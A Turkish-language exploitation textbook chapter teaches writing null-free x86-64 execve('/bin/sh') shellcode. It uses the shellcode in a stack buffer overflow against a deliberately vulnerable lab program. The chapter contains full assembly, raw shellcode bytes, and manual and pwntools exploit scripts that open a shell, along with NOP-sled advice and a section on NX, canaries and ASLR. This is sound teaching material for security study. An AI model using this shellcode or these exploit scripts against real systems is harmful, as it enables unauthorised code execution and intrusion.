# Bölüm 11: Shellcode: kendi kodunu çalıştırmak

## Bu bölümde

`e02_win`'de hazır bir `win` fonksiyonu vardı. Gerçek programlarda böyle bir hediye olmaz. Bu bölümde kodu kendimiz getireceğiz: 24 baytlık bir makine kodu yazıp onu payload'ın içine gömeceğiz, dönüş adresini de o koda çevireceğiz. Sonunda elinde, senin yazdığın komutları çalıştıran bir kabuk olacak. Bunu "kendi elinle yazdığın ilk gerçek exploit" olarak düşünebilirsin.

**Ön koşullar:** Bölüm 3 (izinler, `rwxp` yığın), Bölüm 4 (sistem çağrıları), Bölüm 9–10.

**Bu bölümün sonunda:**

- `execve("/bin/sh", NULL, NULL)` sistem çağrısını x86-64 assembly ile yazıp `nasm` ile makine koduna çevirebileceksin.
- Shellcode'daki her baytın hangi komuta ait olduğunu `objdump` ile gösterebileceksin.
- Null bayt içermeyen shellcode yazmanın gerekçesini açıklayabileceksin.
- Shellcode + dolgu + dönüş adresi düzeninde bir payload kurup kabuk açabileceksin.
- gdb içi ve dışı yığın adreslerinin neden farklı olduğunu açıklayıp iki çözümünü sayabileceksin.

## Sezgi: kendi talimatını getir

Bölüm 9'daki sahte notu hatırla: fonksiyon işini bitirince "buraya dön" notunu okuyup oraya gidiyordu. ret2win'de notu programın kendi odalarından birine yönlendirdik. Şimdi şunu yapacağız: buffer'ın içine, yani yığına, bir talimat listesi bırakacağız ve notu o listeye yönlendireceğiz. Fonksiyon döndüğünde işlemci bizim talimatlarımızı okumaya başlayacak.

Benzetmenin bozulduğu yer: gerçek bir binada herkes her talimatı okuyabilir. Bellekte ise sadece çalıştırılabilir (`x`) işaretli bölgelerdeki baytlar komut olarak okunabilir. Bu programda yığın bilerek çalıştırılabilir yapıldı (`-z execstack`). Normal bir programda bu yol kapalı. Bir sonraki bölüm tamamen bununla ilgili.

## Hedef

```c
/* e03_shell: yigina kendi kodunu koy ve calistir (shellcode). Koruma yok. */
#include <stdio.h>
#include <unistd.h>

void vuln(void)
{
    char buf[128];
    printf("buf adresi: %p\n", (void *)buf);
    printf("girdi: ");
    read(0, buf, 400);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("normal cikis.");
    return 0;
}
```

Program bize bir hediye veriyor: `buf`'ın adresini ekrana yazıyor. Bu, ileride öğreneceğimiz **sızıntı** kavramının en basit hali. Bölümün sonunda, bu hediye olmasaydı ne yapacağımızı da konuşacağız.

## Shellcode ne yapmalı

Hedefimiz bir kabuk açmak. Bölüm 4'te tanıştığımız sistem çağrısı:

```c
execve("/bin/sh", NULL, NULL);
```

`execve` başarılı olursa geri dönmez. Çalışan programı bellekten silip yerine `/bin/sh`'yi yükler. Süreç aynı süreç kalır, sadece içinde çalışan program değişir. Bu yüzden program bizim gönderdiğimiz bir sonraki satırı kabuk komutu olarak okuyacak.

Yazmaçlara çevirelim:

| Yazmaç | Değer | Anlamı |
|---|---|---|
| `rax` | 59 | `execve`'nin numarası |
| `rdi` | `"/bin/sh"` metninin **adresi** | çalıştırılacak program |
| `rsi` | 0 | argüman listesi yok |
| `rdx` | 0 | ortam değişkeni yok |

Ardından `syscall`.

Zor kısım `rdi`. Bir metnin **adresine** ihtiyacımız var, ama `"/bin/sh"` metni bellekte nerede duruyor bilmiyoruz. Çözüm: metni kendimiz yığına koyarız. O zaman adresi `rsp` olur.

## Shellcode'u yazmak

Bu dosya `~/.cracks_src/e03_sc.asm` olarak duruyor:

```nasm
BITS 64
    xor  esi, esi                ; rsi = 0  (argv = NULL)
    push rsi                     ; yığına 8 sıfır bayt: metnin sonu
    mov  rdi, 0x68732f2f6e69622f ; "/bin//sh" (little-endian)
    push rdi                     ; metni yığına koy
    mov  rdi, rsp                ; rdi = "/bin//sh" adresi
    xor  edx, edx                ; rdx = 0  (envp = NULL)
    push 59                      ; execve sistem çağrısı numarası
    pop  rax                     ; rax = 59
    syscall
```

Satır satır:

1. **`xor esi, esi`**: bir değeri kendisiyle XOR'lamak onu sıfırlar. `esi`'ye yazmak `rsi`'nin üst yarısını da sıfırlar (Bölüm 4). Sonuç: `rsi = 0`.
2. **`push rsi`**: yığına 8 sıfır bayt koyar. Bu, birazdan koyacağımız metnin sonundaki null bayt olacak.
3. **`mov rdi, 0x68732f2f6e69622f`**: bu sayı `/bin//sh` metninin little-endian hali. `0x2f` = `/`, `0x62` = `b`, `0x69` = `i`... Sayıyı sağdan sola, ikişer basamak okursan `/bin//sh` çıkar.
4. **`push rdi`**: metni yığına koyar. Yığının tepesinde artık `/bin//sh` ve ardından 8 sıfır var.
5. **`mov rdi, rsp`**: `rsp` metnin başını gösteriyor. `rdi` artık metnin adresi.
6. **`xor edx, edx`**: `rdx = 0`.
7. **`push 59` / `pop rax`**: `rax = 59`.
8. **`syscall`**: çekirdeğe "bu programı `/bin//sh` ile değiştir" der.

Yığın, `syscall` anında şöyle görünüyor:

```text
rsp ──▶ ┌──────────────────────────────┐
        │ 2f 62 69 6e 2f 2f 73 68      │  "/bin//sh"   ← rdi buraya bakıyor
        ├──────────────────────────────┤
        │ 00 00 00 00 00 00 00 00      │  metnin sonu (null)
        └──────────────────────────────┘
```

**Neden `/bin//sh`?** `/bin/sh` 7 karakter, `/bin//sh` tam 8. Tek bir 8 baytlık `mov` ile sığsın diye araya bir `/` daha koyduk. Linux yollarında `//` ile `/` aynı anlama gelir.

**Neden `mov eax, 59` değil de `push 59; pop rax`?** `mov eax, 59` makine kodunda `b8 3b 00 00 00` olur, yani içinde üç tane `0x00` var. Bu programda girdi `read` ile okunduğu için null baytlar sorun değil. Ama `strcpy` ya da `gets` ile okunan bir girdide null bayt payload'ı keser (Bölüm 8). `push 59; pop rax` aynı işi `6a 3b 58` baytlarıyla, hiç sıfır kullanmadan yapar. Null baytsız shellcode yazmak, kitabın dışında da işine yarayacak bir alışkanlık.

## Makine koduna çevirmek

```bash
nasm -f bin e03_sc.asm -o e03_sc.bin
xxd e03_sc.bin
wc -c e03_sc.bin
```

```text
00000000: 31f6 5648 bf2f 6269 6e2f 2f73 6857 4889  1.VH./bin//shWH.
00000010: e731 d26a 3b58 0f05                      .1.j;X..
24 e03_sc.bin
```

24 bayt ve içinde hiç `00` yok. `-f bin`, nasm'a "ELF dosyası değil, sadece ham makine kodu üret" der. Çıktının doğru olduğunu görmek için baytları tekrar assembly'ye çevir:

```bash
objdump -D -b binary -m i386:x86-64 -M intel e03_sc.bin
```

```text
   0:	31 f6                	xor    esi,esi
   2:	56                   	push   rsi
   3:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
   a:	2f 73 68
   d:	57                   	push   rdi
   e:	48 89 e7             	mov    rdi,rsp
  11:	31 d2                	xor    edx,edx
  13:	6a 3b                	push   0x3b
  15:	58                   	pop    rax
  16:	0f 05                	syscall
```

Her komutun yanında kendi baytları var. Bunların bazılarını ezberlersen, gdb'de bir bellek dökümüne bakarken kod olup olmadığını hemen anlarsın: `0f 05` = `syscall`, `c3` = `ret`, `90` = `nop`, `56` = `push rsi`.

## Payload'ın yerleşimi

Buffer `[rbp-0x80]`, yani dönüş adresine mesafe `0x80 + 8 = 136` (Bölüm 5'teki tablo).

```text
buf adresi (örnek: 0x7fffffffd650)
│
▼
┌──────────────────────┬──────────────────────────────┬────────────────────┐
│ shellcode (24 bayt)  │ AAAA... dolgu (136-24 = 112) │ dönüş adresi = buf │
└──────────────────────┴──────────────────────────────┴────────────────────┘
0                      24                             136                144
                                                       │
                     ret buraya bakar ─────────────────┘
                     rip = buf olur → shellcode çalışır
```

Bölüm 10'daki ret2win ile tek fark, dönüş adresine bir fonksiyonun değil **kendi buffer'ımızın** adresini yazmak.

## Deneme sürüşü: elle

Önce `setarch -R` ile ASLR'yi kapatıp buffer adresini öğren:

```bash
setarch -R ~/cracks/e03_shell < /dev/null
```

```text
buf adresi: 0x7fffffffd650
girdi: normal cikis.
```

Payload'ı oluştur ve kontrol et:

```bash
python3 -c '
import sys, struct
sc = open("e03_sc.bin","rb").read()
sys.stdout.buffer.write(sc + b"A"*(136-len(sc)) + struct.pack("<Q", 0x7fffffffd650))' > /tmp/p3
xxd /tmp/p3 | head -2; xxd /tmp/p3 | tail -1
```

```text
00000000: 31f6 5648 bf2f 6269 6e2f 2f73 6857 4889  1.VH./bin//shWH.
00000010: e731 d26a 3b58 0f05 4141 4141 4141 4141  .1.j;X..AAAAAAAA
00000080: 4141 4141 4141 4141 50d6 ffff ff7f 0000  AAAAAAAAP.......
```

Baştaki 24 bayt shellcode, sonra `A`'lar, en sonda `50 d6 ff ff ff 7f 00 00` = `0x7fffffffd650`. Gönder ve kabuğa bir komut ver:

```bash
(cat /tmp/p3; sleep 0.3; echo 'echo SHELL_ACILDI; id -un') | setarch -R ~/cracks/e03_shell
```

```text
buf adresi: 0x7fffffffd650
girdi: SHELL_ACILDI
linkola
```

`SHELL_ACILDI` yazısı, gönderdiğimiz komutu bir kabuğun çalıştırdığını gösteriyor. `e03_shell` artık `e03_shell` değil, `/bin/sh`.

`sleep 0.3` neden var? Bölüm 8'deki zamanlama tuzağı: `read` 400 bayta kadar okuyor. Komutu payload'la aynı anda gönderirsek `read` ikisini birden yutar ve komut kabuğa hiç ulaşmaz.

Etkileşimli bir kabuk için:

```bash
(cat /tmp/p3; cat) | setarch -R ~/cracks/e03_shell
```

İstem görmezsin, ama `ls` yazıp Enter'a basınca dosyalar listelenir. Çıkmak için Ctrl-D.

## Deneme sürüşü: pwntools ile

Bu dosya `~/.cracks_src/e03_shell_x.py` olarak duruyor:

```python
from pwn import *
context.arch = "amd64"

p = process(["setarch", "-R", "/home/linkola/cracks/e03_shell"])
p.recvuntil(b"buf adresi: ")
buf = int(p.recvline(), 16)          # hediye adresi oku
log.info(f"buf = {hex(buf)}")

sc = open("/home/linkola/.cracks_src/e03_sc.bin", "rb").read()
payload = sc + b"A" * (136 - len(sc)) + p64(buf)
p.send(payload)
p.recvuntil(b"girdi: ")
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(), p.recvline())
```

```text
[*] buf = 0x7fffffffd650
b'SHELL_ACILDI\n' b'linkola\n'
```

Bu sefer adresi elle yazmadık. Programın o anda söylediği adresi okuyup kullandık. Küçük bir fark gibi görünüyor ama sonucu büyük: **bu exploit ASLR açıkken de çalışır.** Adres değişse de program bize yenisini söylüyor. `setarch -R`'yi kaldırıp dene.

pwntools hazır shellcode da üretebilir:

```python
sc = asm(shellcraft.sh())    # bu makinede 48 baytlık bir /bin/sh shellcode'u
```

Ama önce kendininkini yaz. Hazır shellcode çalışmadığında neden çalışmadığını ancak onun ne yaptığını biliyorsan bulabilirsin.

## Hediye olmasaydı: adresler neden kayar

Gerçek programlar buffer'ın adresini söylemez. Aklına "adresi gdb'de bulur, payload'a sabit yazarım" gelebilir. Şu ölçümlere bak:

```bash
setarch -R ./e03_shell < /dev/null | head -1                    # ~/cracks içinden
cd /tmp && setarch -R /home/linkola/cracks/e03_shell < /dev/null | head -1
pwndbg -q -batch -ex 'r < /dev/null' ./e03_shell | grep buf
```

```text
buf adresi: 0x7fffffffd6c0
buf adresi: 0x7fffffffd6a0
buf adresi: 0x7fffffffd3d0
```

ASLR kapalıyken bile üç farklı adres. Ve pwntools'un başlattığı süreçte dördüncü bir adres görmüştük: `0x7fffffffd650`.

Sebep, yığının en dibinde duran şeyler: program çalışırken çekirdek yığının en yüksek adreslerine programın **argümanlarını** ve **ortam değişkenlerini** koyar. Programı `./e03_shell` yerine `/home/linkola/cracks/e03_shell` diye çalıştırınca `argv[0]` 19 karakter uzar. Çekirdek yığını 16 baytlık sınırlara hizaladığı için her şey `0x20` = 32 bayt aşağı kayar: `0x...d6c0` → `0x...d6a0`. gdb de kendi ortam değişkenlerini (`LINES`, `COLUMNS` gibi) eklediği için gdb içindeki adres yüzlerce bayt farklı çıkar.

Bunun iki klasik çözümü var:

1. **NOP kızağı (NOP sled).** `nop` (`0x90`), "hiçbir şey yapma, sonrakine geç" komutu. Shellcode'un önüne yüzlerce `0x90` koyarsan, dönüş adresi kızağın herhangi bir yerine denk geldiğinde işlemci kayarak shellcode'a ulaşır. Adresi tam bilmen gerekmez, yaklaşık bilmen yeter.
2. **Sızıntı.** Programdan gerçek adresi bir şekilde öğrenmek. Kitabın geri kalanında asıl yöntem bu olacak.

> [!WARNING]
> **Sinsi bir tuzak:** Shellcode, yığına `push` yaparak metni yazıyor. `ret`'ten sonra `rsp` buffer'ın 144 bayt ilerisini gösterir ve `push`'lar oradan geriye doğru yazar. Shellcode'u buffer'ın başına koyduğumuz için bu `push`'lar onun baytlarına ulaşmaz. Ama shellcode'u dönüş adresine çok yakın koysaydın, kendi `push`'ları kendi baytlarını bozabilirdi. Program anlamsız bir yerde SIGILL ya da SIGSEGV ile ölür ve hata ilk bakışta hiç anlaşılmaz.

## Savunma tarafı

Bu saldırının çalışması için yığının çalıştırılabilir olması şarttı. **NX** tam olarak bunu engeller. Aynı kaynak kodu `-z execstack` olmadan derleyip aynı pwntools exploit'ini çalıştırdık:

```text
cikis kodu: -11
```

Program SIGSEGV ile öldü. `ret` doğru adrese zıpladı, `rip` shellcode'un başını gösterdi, ama işlemci `rw-` bir sayfadaki baytları komut olarak çalıştırmayı reddetti. Modern derleyiciler ve çekirdek, yığını varsayılan olarak çalıştırılamaz yapar. Bugün shellcode'u doğrudan yığından çalıştırma şansı neredeyse hiç kalmadı. Shellcode yine de ölmedi: JIT derleyicili programlarda, gömülü sistemlerde ve ROP ile bir bölgeyi önce çalıştırılabilir yapan (`mprotect`) exploit'lerde hâlâ kullanılıyor.

Diğer savunmalar:

- **Canary**, dönüş adresine ulaşmayı fark eder.
- **ASLR**, buffer'ın adresini tahmin edilemez yapar. Bu programdaki gibi bir sızıntı yoksa NOP kızağıyla bile isabet şansı çok düşer.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Shellcode'un uzunluğunu dolguya katmamak.** Dolgu `136 − len(sc)` olmalı, 136 değil.
> - **gdb'de bulunan yığın adresini gdb dışında kullanmak.** Ortam farkı yüzünden kayar.
> - **`push`'ların shellcode'un kendi baytlarını bozması.** Shellcode'u buffer'ın başına koy.
> - **Kabuk açıldığı halde komutların kaybolması.** Zamanlama tuzağı: `sleep` ya da `ljust`.
> - **Shellcode'u test etmeden payload'a koymak.** Önce `objdump -D -b binary` ile baytları kontrol et.

## Kontrol soruları

1. `execve` başarılı olunca neden geri dönmez?
2. `mov rdi, rsp` komutundan sonra `rdi` neyi gösterir?
3. `0x68732f2f6e69622f` hangi metin?
4. `mov eax, 59` neden null bayt içerir, `push 59; pop rax` neden içermez?
5. Payload'daki dönüş adresi neden buffer'ın adresi?
6. Aynı program neden gdb içinde ve dışında farklı buffer adresleri gösteriyor?
7. NX açık derlenmiş programda bu exploit neden çalışmaz?

## Alıştırmalar

1. **Gözlemle.** pwntools exploit'ini çalıştırıp `setarch -R`'yi kaldır. Adres her çalıştırmada değişiyor mu? Exploit hâlâ çalışıyor mu? Neden?
2. **Tahmin et, sonra dene.** Shellcode'u NOP kızağıyla yeniden kur: `b"\x90"*80 + sc + dolgu + p64(buf+40)`. Çalışacak mı? `buf+70` dene, sonra `buf+110`. Hangisi neden çalışmaz?
3. **Kendin yap.** Shellcode'u `exit(42)` yapacak şekilde değiştir (`rax = 60`, `rdi = 42`). Programı çalıştırıp `echo $?` ile 42'yi gör. Null bayt kullanmamaya çalış.

## Özet

- Shellcode, payload'ın içine gömülmüş makine kodudur. Dönüş adresi shellcode'un adresine çevrilir.
- `execve("/bin/sh", 0, 0)`: `rax=59`, `rdi`=metnin adresi, `rsi=rdx=0`, `syscall`.
- Metin yığına `push` edilir, adresi `rsp`'den alınır.
- `nasm -f bin` ile derle, `xxd` ve `objdump -D -b binary` ile kontrol et.
- Null baytsız yaz: `push 59; pop rax`, `xor esi,esi`.
- Yığın adresleri ortamla kayar. Çözüm NOP kızağı ya da sızıntı.
- NX açıkken yığındaki shellcode çalışmaz (çıkış kodu −11).

Bir sonraki bölümde NX açılıyor ve yığındaki her bayt kod olarak çalıştırılamaz hale geliyor. Peki kendi kodumuzu getiremiyorsak? Programın zaten sahip olduğu kodu kullanacağız.

---
**Kontrol sorularının cevapları**

1. Çalışan programın yerine yeni bir program yükler. Dönülecek eski kod artık bellekte yoktur.
2. Yığının tepesine az önce konan `/bin//sh` metnini.
3. `/bin//sh`. Baytlar `2f 62 69 6e 2f 2f 73 68`.
4. `mov eax, imm32` 4 baytlık bir sabit alır, 59 = `3b 00 00 00`. `push imm8` tek baytlık bir sabit kullanır.
5. Shellcode buffer'ın başında duruyor. `ret` oraya zıplayınca shellcode çalışır.
6. Yığının dibindeki argümanlar ve ortam değişkenleri farklı. gdb fazladan değişken ekliyor, yol uzunluğu da değişiyor.
7. Yığın `rw-` olur. İşlemci çalıştırılamaz bir sayfadaki komutu çalıştırmayı reddeder ve SIGSEGV üretir.

**Bu bölümde geçen yeni terimler:** shellcode, `execve`, `nasm`, null baytsız kod, NOP kızağı, ortam değişkenleri, NX.

---

[← 05-donus-adresi-ve-ret2win](05-donus-adresi-ve-ret2win.md) · [İçindekiler](README.md) · [07-nx-rop-aslr →](07-nx-rop-aslr.md)
